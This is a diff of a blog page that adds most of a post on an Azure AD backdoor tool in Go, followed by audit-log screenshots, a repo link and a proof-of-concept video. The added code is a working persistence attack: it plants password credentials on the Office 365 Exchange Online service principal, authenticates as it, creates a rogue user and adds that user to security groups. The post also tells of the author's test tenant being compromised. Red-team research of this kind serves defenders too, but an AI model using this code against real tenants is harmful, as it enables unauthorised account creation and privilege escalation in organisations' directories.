+                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Error Adding PasswordCredential To Office 365 Exchange Online App&#34;</span>)
+                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Exiting....&#34;</span>)
+                <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">2</span>)
+            }<span style="color:#66d9ef">else</span>{
+                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Successfully Added PasswordCredentials To Office 365 Exchange Online App&#34;</span>)
+                <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] PasswordCredentials :=&gt; %s : %s\n&#34;</span>,<span style="color:#a6e22e">ExchangeAppId</span>,<span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">Value</span>)
+            }
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] Attempting To Login As The Office 365 Exchange Online Application...\n&#34;</span>)
+            <span style="color:#a6e22e">ExchangeAppIdGlobal</span> = <span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>
+            <span style="color:#a6e22e">ExchangeAuthTokenStruct</span> = <span style="color:#a6e22e">authAsSPN</span>(<span style="color:#e6db74">&#34;https://graph.windows.net&#34;</span>,<span style="color:#a6e22e">SPNs</span>.<span style="color:#a6e22e">Value</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">AppID</span>,<span style="color:#a6e22e">NewCredsToAddExchange</span>.<span style="color:#a6e22e">Value</span>.(<span style="color:#66d9ef">string</span>),<span style="color:#a6e22e">TenantId</span>)
+
+        }
+    }
+    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">ExchangeAuthTokenStruct</span>.<span style="color:#a6e22e">AccessToken</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">O365AuthTokenStruct</span>.<span style="color:#a6e22e">AccessToken</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Have Auth Tokens For Both Apps...&#34;</span>)
+    } <span style="color:#66d9ef">else</span> {
+        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Do Not Have Auth Tokens For Both Apps...Something Went Wrong Exiting...&#34;</span>)
+        <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Exit</span>(<span style="color:#ae81ff">2</span>)
+    }
+    
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Creating User Via O365 App...&#34;</span>)
+    <span style="color:#a6e22e">NewUserResult</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">CreateUser</span>(<span style="color:#a6e22e">O365AuthTokenStruct</span>.<span style="color:#a6e22e">AccessToken</span>,<span style="color:#a6e22e">TenantId</span>,<span style="color:#a6e22e">DirectoryName</span>[<span style="color:#ae81ff">1</span>],<span style="color:#f92672">*</span><span style="color:#a6e22e">addedUserptr</span>)
+    <span style="color:#a6e22e">NewUserObjId</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">NewUserResult</span>.<span style="color:#a6e22e">ObjectID</span>
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;[*] Successfully Created The Following User: %s@%s Pass: %s\n&#34;</span>,<span style="color:#f92672">*</span><span style="color:#a6e22e">addedUserptr</span>,<span style="color:#a6e22e">DirectoryName</span>[<span style="color:#ae81ff">1</span>],<span style="color:#a6e22e">pwndpass</span>)
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Using Exchange Online App To Enumerate Groups...&#34;</span>)
+    <span style="color:#a6e22e">EnumGrpResult</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">EnumerateGroups</span>(<span style="color:#a6e22e">ExchangeAuthTokenStruct</span>.<span style="color:#a6e22e">AccessToken</span>,<span style="color:#a6e22e">TenantId</span>)
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">GrpObjMap</span> = make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">string</span>)
+    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span>  <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">EnumGrpResult</span>.<span style="color:#a6e22e">Value_Grp</span>{
+        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">EnumGrpResult</span>.<span style="color:#a6e22e">Value_Grp</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">SecurityEnabled_Grp</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">true</span>{
+            <span style="color:#a6e22e">GrpObjMap</span>[<span style="color:#a6e22e">EnumGrpResult</span>.<span style="color:#a6e22e">Value_Grp</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">DisplayName_Grp</span>] = <span style="color:#a6e22e">EnumGrpResult</span>.<span style="color:#a6e22e">Value_Grp</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">ObjectID_Grp</span>
+        }
+    }
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">GrpObjMap</span>)
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Successfully Enumerated Groups&#34;</span>)
+
+    
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Reconnecting to Azure Management Resource&#34;</span>)
+    <span style="color:#a6e22e">AzureManagementAuthStruct</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">authAsSPN</span>(<span style="color:#e6db74">&#34;https://graph.microsoft.com&#34;</span>,<span style="color:#a6e22e">ExchangeAppIdGlobal</span>,<span style="color:#a6e22e">pwndpass</span>,<span style="color:#a6e22e">TenantId</span>)
+
+    <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;[*] Unfortunately we dont have permissions to check the assigned group roles&#34;</span>)
+    <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">GrpObjMap</span> {
+        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Add user to this group? %s y/n or q to quit\n&#34;</span>,<span style="color:#a6e22e">x</span>)
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">userchoice2</span> <span style="color:#66d9ef">string</span>    
+        <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Scanln</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">userchoice2</span>)
+        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">userchoice2</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;y&#34;</span>{
+            <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Attempting To User To Following Group %s:::%s\n&#34;</span>,<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
+            <span style="color:#a6e22e">AddUserToGrp</span>(<span style="color:#a6e22e">AzureManagementAuthStruct</span>.<span style="color:#a6e22e">AccessToken</span>,<span style="color:#a6e22e">TenantId</span>,<span style="color:#a6e22e">NewUserObjId</span>,<span style="color:#a6e22e">y</span>)
+        }<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">userchoice2</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;q&#34;</span>{
+            <span style="color:#66d9ef">break</span>
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">continue</span>
+        }
+    }
+</code></pre></div><h2 id="well-now-what">Well now what</h2>
+<p>The powershell shows up in event viewer.
+<img src="https://christopherja.rocks/event.png" alt=""></p>
+<p>Also heres what it looks like in the azure AD Audit logs</p>
+<p><img src="https://christopherja.rocks/azaudit.png" alt=""></p>
+<p>You can see the Sync account updating the service principals and then those applications creating a user and adding to groups respectively.</p>
 <h2 id="final-thoughts">Final Thoughts</h2>
-<p>yeah idk azure phishing is going to be crazy</p>
+<p>During the research for the api i used this app even though i knew it was phishy
+<a href="https://graphexplorer.azurewebsites.net/">https://graphexplorer.azurewebsites.net/</a>
+And i got my azure test environment hacked&hellip;But it was really cool to see some tactics performed by a real adversary.
+He invited himself as a guest and created an azure web app proxy to get access to my on prem test env remotely. May look into this in the future. So if anyone wants to set up a honeypot azure tenant that link is the way to do it as its actively being used to target people.</p>
 <h2 id="more-links">More Links</h2>
-<p>heres some links</p>
+<ul>
+<li><a href="https://www.jetbrains.com/decompiler/">https://www.jetbrains.com/decompiler/</a></li>
+<li><a href="https://www.telerik.com/fiddler">https://www.telerik.com/fiddler</a></li>
+<li><a href="https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html">https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html</a></li>
+<li><a href="https://github.com/dirkjanm/ROADtools">https://github.com/dirkjanm/ROADtools</a></li>
+</ul>
 <h2 id="why-golang">Why Golang?</h2>
-<p>Idk just trying it out.</p>
+<p>Idk just trying it out. Probably will go back to learning C though.</p>
+<h2 id="repo-link">Repo Link</h2>
+<p><a href="https://github.com/latortuga71/Learning_GO/tree/master/AzureADBackDoor">https://github.com/latortuga71/Learning_GO/tree/master/AzureADBackDoor</a></p>
+<h2 id="poc-video">POC Video</h2>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/GW6CC6ZUVfk" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
 
             </div>
         </article>
@@ -171,7 +417,7 @@
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://christopherja.rocks/tags/golang">Golang</a></span><span class="tag"><a href="https://christopherja.rocks/tags/azure">Azure</a></span><span class="tag"><a href="https://christopherja.rocks/tags/azuread">AzureAD</a></span>
                 </p>
 
-            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>192 Words</p>
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1626 Words</p>
 
             <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-05-28 09:53 -0400</p>
         </div>
